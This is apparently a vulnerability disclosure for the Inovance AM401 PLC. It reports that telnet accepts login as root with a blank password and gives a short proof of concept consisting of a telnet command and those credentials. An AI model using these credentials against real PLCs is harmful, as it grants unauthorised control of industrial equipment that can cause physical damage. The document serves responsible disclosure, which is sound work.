# Summary
Inovance AM401 PLC telnet has a weak password vulnerability, attackers can log in to the PLC device through the weak password.
# Details
Connectivity test of the device:
![image](https://github.com/user-attachments/assets/44cff17b-8e33-4452-a99a-361b0d14bd49)

Telnet to the device:
```bash
telnet 192.168.1.88
```
Log in with a weak password, username `root`, and a blank password.
![image](https://github.com/user-attachments/assets/250a0a0c-303a-41b3-86ae-53306f0db7b0)


# PoC
```bash
telnet 192.168.1.88
```

username: root

password: (None)

# Discoverer
ylqncepu@163.com

https://github.com/N0zoM1z0

Li Chunan(804242129@qq.com)
